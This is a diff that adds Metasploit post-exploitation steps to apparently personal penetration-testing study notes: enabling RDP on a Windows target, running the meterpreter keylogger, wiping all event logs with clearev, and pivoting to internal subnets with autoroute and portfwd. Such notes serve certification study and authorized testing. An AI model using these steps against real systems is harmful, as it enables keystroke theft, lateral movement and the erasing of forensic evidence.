@@ -1015,5 +1015,35 @@ With an anonymous null session you can access the IPC$ share and interact with s
   
   
   
+  ### Enabling RDP on a windows target
+  - RDP is disabled by default
+  - we can use a msf module to enable it
+  - RDP authentication need a legitmate username and password (clear text!)
+  - post/windows/manage/enable_rdp is the module name
+  - use xfreerdp /u:administrator /p:<<password>> /v:<<ip>> to connect from a linux client.
+  
+  ### Windows Keylogging
+  -  works best when migrated to the explorer.exe process!
+  - start the keylogger directly from meterpreter -> keyscan_start, keyscan_stop, keyscan_dump
+  
+  ### Clearing Windows Event Logs
+  - from a meterpreter session run "clearev" to completely erase all events
+  
+  ### Pivoting with meterpreter
+  - using a compromised host to exploit other host on the internal network
+  - from a meterpreter session, you can run:
+    - "run autoroute -s x.x.x.x/xx" to add a route to another subnet that is connected to the compromised host
+  - from there we can interact with this subnet over the compromised host.
+  - we'll need to setup portforwarding on the first victim, because we need to interact with victim 2 over victim 1. 
+    - in meterpreter: portfwd add -l 1234 -p -r <<victim2>>
+    - db_nmap -sV -sC -p 1234 localhost
+  
+  
+  
+  
+  
+  
+  
+  
   
   
